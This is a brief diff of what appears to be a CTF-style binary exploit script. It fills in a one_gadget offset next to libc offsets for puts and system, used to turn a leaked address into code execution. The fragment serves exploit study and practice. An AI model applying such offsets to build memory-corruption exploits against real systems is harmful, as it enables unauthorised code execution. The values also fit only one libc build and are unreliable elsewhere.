@@ -9,7 +9,7 @@ ENV = {"LD_PRELOAD":"./libc.so.6"}
 
 puts_got_off = 0x202020
 puts_addr_off = 0x6f690
-one_gadget_off = 0x01
+one_gadget_off = 0x4526a
 system_off = 0x45390
 
 if len(sys.argv) > 1:
